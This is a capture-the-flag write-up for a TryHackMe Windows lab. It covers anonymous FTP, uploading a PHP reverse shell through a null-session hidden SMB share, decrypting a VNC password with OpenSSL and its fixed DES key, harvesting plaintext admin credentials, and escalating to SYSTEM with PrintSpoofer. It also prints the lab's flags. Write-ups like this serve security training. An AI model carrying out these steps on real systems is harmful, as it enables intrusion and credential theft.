# CTF: AllSignsPoint2Pwnage (THM)

## Metadata

- **Target IP:** 10.49.186.41
    
- **OS:** Windows 10 (Build 18362)
    
- **Difficulty:** Easy/Medium
    
- **Date:** 2025-11-24
    
- **Tags:** #THM #Windows #SMB #PHP #PrintSpoofer #VNC
    

---

## Reconnaissance

### Port Scanning

A full TCP scan revealed a wide attack surface, including web, file sharing, and remote access services.

Bash

```
nmap -p- -Pn -v --min-rate 1000 $target -oN nmap_ports.txt
```

**Key Ports:**

- **21/tcp:** FTP (Microsoft ftpd)
    
- **80/443/tcp:** HTTP/HTTPS (Apache 2.4.46, PHP 7.4.11)
    
- **139/445/tcp:** SMB
    
- **3389/tcp:** RDP
    
- **5900/tcp:** VNC
    

### FTP Enumeration

The FTP service allowed **anonymous login**. I found a file named `notice.txt` which provided a critical hint about the environment's configuration.

Plaintext

```
NOTICE: Due to customer complaints about using FTP we have now moved 'images' to a hidden windows file share for upload and management of images.
- Dev Team
```

---

## Foothold

### Hidden SMB Share Access

Based on the hint, I checked for a hidden share named `images$`. I was able to connect with a null session.

Bash

```
smbclient //$target/images$
```

The share mapped directly to the web root's images directory. Since the server supports PHP, I uploaded a reverse shell:

Bash

```
smb: \> put revshell.php
```

### Initial Shell

By navigating to `http://10.49.186.41/images/revshell.php` and starting a listener, I obtained a shell as the user `sign`.

- **User Flag:** `thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}`
    

---

## Credential Cracking

### VNC Password Decryption

During enumeration, I found `C:\Installs\ultravnc.ini`. It contained a hex-encoded password for the VNC service: `B3A8F2D8BEA2F1FA70`.

VNC uses a fixed DES key (`e84ad660c4721ae0`). I decrypted it using OpenSSL:

Bash

```
echo -n B3A8F2D8BEA2F1FA70 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy
```

- **VNC Password:** `5upp0rt9`
    

### Plaintext Admin Credentials

Further searching in `C:\Installs` revealed a deployment script `Install_www_and_deploy.bat`. It contained hardcoded credentials for the local administrator used with `psexec`.

- **User:** `administrator`
    
- **Password:** `RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi`
    

---

## Privilege Escalation

### SeImpersonatePrivilege (PrintSpoofer)

While I had the administrator's password, I checked my current privileges and found `SeImpersonatePrivilege` enabled. This allows for a much faster escalation to `SYSTEM` using **PrintSpoofer**.

PowerShell

```
C:\Users\sign\Documents> PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

| **Flag Type** | **Value**                                                |
| ------------- | -------------------------------------------------------- |
| **User**      | `thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}`   |
| **Root**      | `thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}` |
